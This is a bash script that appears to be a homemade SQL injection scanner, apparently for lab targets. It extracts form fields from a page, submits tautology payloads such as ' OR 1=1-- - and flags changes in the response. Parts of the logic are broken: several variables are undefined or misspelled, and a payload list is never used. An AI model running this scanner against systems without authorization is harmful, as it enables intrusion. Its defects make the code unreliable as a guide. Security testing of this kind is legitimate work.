#!/bin/bash

# =========================
# Configuration
# =========================
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
TIMEOUT=5
threads=10
verbose=false

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
verbose=false
# =========================
# curl helpers
# =========================

curl_body() {
    local url="$1"

    [ "$verbose" = true ] && echo "[curl-body] $url" >&2

    curl -s -L \
        --max-time "$TIMEOUT" \
        -A "$USER_AGENT" \
        --parallel --parallel-max "$threads" \
        "${CURL_OPTS[@]}" \
        "$url"
}


curl_status() {
    local url="$1"

    [ "$verbose" = true ] && echo "[curl-status] $url" >&2

    curl -s \
        -o /dev/null \
        -w "%{http_code}" \
        --max-time "$TIMEOUT" \
        -A "$USER_AGENT" \
        --parallel --parallel-max "$threads" \
        "${CURL_OPTS[@]}" \
        "$url"
}

# =========================
# HTML helpers
# =========================

has_input_elements() {
    local html="$1"

    echo "$html" | grep -qi \
        "<input\|<form\|<textarea\|<select\|document\.forms\|\.submit()\|addEventListener.*submit\|fetch.*POST\|axios\.post"
}

extract_input_fields() {
    local html="$1"

    echo "$html" |
        grep -Ei '<input|<textarea|<select' |
        grep -oE 'name=["'\'']?[^"'\'' >]+' |
        sed 's/name=["'\'']//g' |
        sort -u
}

extract_submit_fields() {
    local html="$1"

    echo "$html" |
        grep -Ei '<input[^>]+type=["'\'']?submit|<button[^>]+type=["'\'']?submit' |
        grep -oE 'name=["'\'']?[^"'\'' >]+' |
        sed 's/name=["'\'']//g' |
        sort -u
}

## --- Helper Functions Count Difference Elements
# Extract HTTP body from curl response (removes status code)
extract_body() {
    # Remove the last line (status code) added by curl -w
    head -n -1
}
# Count HTML elements in response
count_elements() {
    local response="$1"
    echo $response | grep -o '<[^>]*>' | wc -l

}
# Extract page title for identification
get_page_title() {
    local response="$1"
    echo "$response" | grep -o '<title>[^<]*</title>' | sed 's/<title>\(.*\)<\/title>/\1/' | head -1
}
# Helper to check specific pattern changes
check_pattern_changes() {
    local original_body="$1"
    local sql_body="$2"
    
    # Common patterns to check
    patterns=(
        "product" "item" "row" "record" "entry"
        "<div>" "<tr>" "<li>" "<img " "href=" "<pre>"
    )

    echo "Element Count Analysis:"
    for pattern in "${patterns[@]}"; do
        orig_count=$(echo "$original_body" | grep -c "$pattern")
        sql_count=$(echo "$sql_body" | grep -c "$pattern")

        if [ "$orig_count" != "$sql_count" ]; then
            change=$(( sql_count - orig_count ))
            echo -e "      $pattern: ${orig_count} → ${sql_count} (+${change})"
        fi

    done
    #echo "====Original Count: $orig_count"
    #echo "====SQL Count: $sql_body_count"
    #Check for SQL error messages
    
    errorOnResonse= echo $sql_body | grep -qi "sql.*error\|syntax.*error\|mysql\|postgresql\|oracle"

    #if echo "$sql_body" | grep -qi "sql.*error\|syntax.*error\|mysql\|postgresql\|oracle"; then
        if [[ $errorOnReponse == True ]]; then
        echo -e "${YELLOW}[!] - Response Contains Errors, indication potential SQl Injection is possible${NC}"
        echo -e "${BLUE}Reason:$errorOnResonse${NC}"

    fi
    #fi
}
## -------------------------------------------------- Helper functions Count Difference on Elements




# =========================
# SQL injection testing
# =========================

test_input_sqli() {
    local url="$1"
    local field="$2"

    declare -g original_body
    declare -g original_body_size

    #echo -e "${BLUE}[*] Testing field: $field${NC}"

    local base_value="test"
    local base_url

    if [[ "$url" == *"?"* ]]; then
        base_url="${url}&${field}=${base_value}"
    else
        base_url="${url}?${field}=${base_value}"
    fi

    original_body=$(curl_body "$base_url") #---------------------------------------------------- #Orignal Body Response
    original_body_size=$(printf "%s" "$original_body" | wc -c)
source config.sh
# Create grep pattern from falsePositiveResponse array
patterns=$(IFS='|'; echo "${sqliFormPayloads[*]}")


    for payload in "${sqliFormPayloads[@]}"; do
        encoded=$(curl -sG \
            --data-urlencode "$field=$payload" \
            -o /dev/null \
            -w '%{url_effective}' \
            "$url" | sed "s/^.*[?&]$field=//")

        local test_url
        if [[ "$url" == *"?"* ]]; then
            test_url="${url}&${field}=${encoded}&Submit=Submit"
        else
            test_url="${url}?${field}=${encoded}&Submit=Submit"
        fi


        sql_body=$(curl_body "$test_url") #---------------------------------------------------- #SQL Body Response
        sql_body_size=$(printf "%s" "$sql_body" | wc -c)
        diff=$(( sql_body_size - original_body_size ))


        if (( diff > 50 || diff < -50 )); then
            #echo "Difference in response $diff characters"
            echo -e "${RED}[!] Possible SQLi${NC} Field: ${YELLOW}'$field'${NC} Payload: ${YELLOW}$payload${NC} (Δ=${YELLOW}$diff${NC} bytes)"
            return 1
        fi
    done

    return 0
}


# =========================
# Main logic
# =========================

test_page_for_sqli() {
    local url="$1"
    if [[ $verbose == true ]]; then
    echo -e "${GREEN}[*] Analyzing: $url${NC}"
    fi
    response=$(curl_body "$url")
#    echo "$response"
submit_fields=$(extract_submit_fields "$response")
submit_field=$(echo "$submit_fields" | head -n1)
#echo "Submit Field:$submit_field"

    
fields=$(extract_input_fields "$response")
field_count=$(echo "$fields" | wc -l)
    if [[ $verbose == true ]]; then
        if ! has_input_elements "$response"; then
        echo -e "${YELLOW}[-] No input elements found${NC}"
        return
        fi
    echo -e "${GREEN}[+] Page contains input elements${NC}"
    echo -e "${BLUE}[+] Found $field_count input field(s):${NC}"
    echo -e "$fields"  | sed 's/^/  - /'
    fi

#--------------- Check Difference Count of Elements Place logic inside For Loop---------------------

    for field in $fields; do
        if test_input_sqli "$url" "$field"; then
        original_count=$(count_elements "$original_body")
        sql_count=$(count_elements "$sql_body")
        #echo -e "${BLUE}SQL Count: $sql_count${NC}"
        #echo "Original Count: $original_count"                

        domain=$(echo $url| cut -d "/" -f 3 | cut -d "." -f 1-3)
        sqlBodyTempFile="/tmp/sql_body_$domain.html"
        originalBodyTempFile="/tmp/original_body_$domain.html"

        echo  -e  "${BLUE}$sql_body${NC}" > $sqlBodyTempFile #sql Injection body
        #echo -e "${RED}-------------------------------------------------------------------------------${NC}"
        echo -e  "${GREEN}$original_body${NC}" > $originalBodyTempFile
        #echo -e  "${GREEN}$test1${NC}"

        if [[ $verbose == true ]]; then
        echo -e "${BLUE}}------------- Difference between requests -------------${NC}"
        differenceBetweenRequests=$(diff "$originalBodyTempFile" "$sqlBodyTempFile" | grep -i "$field")
        countDifferenceBetweenRequests=$(echo "$differenceBetweenRequests" | wc -w)
            if [[ $countDifferenceBetweenRequests -ge 150 ]]; then
                echo "DIfference between requests too large to show on verbose, please check manually"
            else
            echo "$differenceBetweenRequests"
            echo -e "${BLUE}----------------------------------------------------------$NC"
            fi
        fi



if [[ "$original_title" != "$sql_title" ]]; then
    echo -e "${RED}⚠️ Title changed!${NC}"
    echo "Original: $original_title"
    echo "SQL test: $sql_title"
fi

    #----------------------- Check Count of Elements
 if [ "$sql_count" -gt "$original_count" ]; then
        if [ $increase_pct -ge $THRESHOLD_PERCENT ]; then
            echo -e "${YELLOW}---------------------------------------------------------------------${NC}"
            echo -e "${RED}[VULNERABLE] ⚠️ POSSIBLE SQL INJECTION VULNERABILITY DETECTED!${NC}"
            echo -e "    URL: ${YELLOW}$url${NC}"
            echo -e "    Payload: ${YELLOW}$payload${NC}"
            echo -e "    Reason: ${BLUE}Elements on page increased$ ${increase_pct}% (${original_count} → ${sql_count})${NC}"
            if [[ $versbose == true ]]; then

            #echo ""
            
            # Try to identify what changed (product count, etc.)
           echo "    Element Count Analysis:"
           echo "       Original: $original_count HTML elements"
           echo "       SQL test: $sql_count HTML elements"
    
            # Check for common patterns
            check_pattern_changes "$original_body" "$sql_body"
            fi
            return 1  # Vulnerability detected
        else
            echo "[-] Minor element count change (${increase_pct}%)"
            return 0  # Not vulnerable
        fi
    elif [ "$sql_count" -lt "$original_count" ]; then
        decrease_pct=$(( (original_count - sql_count) * 100 / original_count ))
        echo "[-] Element count decreased by ${decrease_pct}%"
        echo "(Could be error-based SQLi or application error)"
        return 0
    else
        #echo "[-] No change in element count"
        return 0
    fi


# Clean up temp files
#rm $sqlBodyTempFile
#rm $originalBodyTempFile


        fi
    done

}

# =========================
# Payloads
# =========================

SQLI_PAYLOADS=(
    "' OR '1'='1'-- -"
    "' OR 1=1-- -"
    "\" OR \"1\"=\"1\"-- -"
)

# =========================
# Entry point
# =========================

if [ -z "$1" ]; then
    echo "Usage: $0 <url> [curl options]"
    echo "Example:"
    echo "  $0 https://target -H \"Cookie: PHPSESSID=123; key=low\""
    exit 1
fi

URL="$1"
shift

CURL_OPTS=()

while [[ $# -gt 0 ]]; do
    case "$1" in
        -v|--verbose)
            verbose=true
            shift
            ;;
        *)
            CURL_OPTS+=("$1")
            shift
            ;;
    esac
done

test_page_for_sqli "$URL"

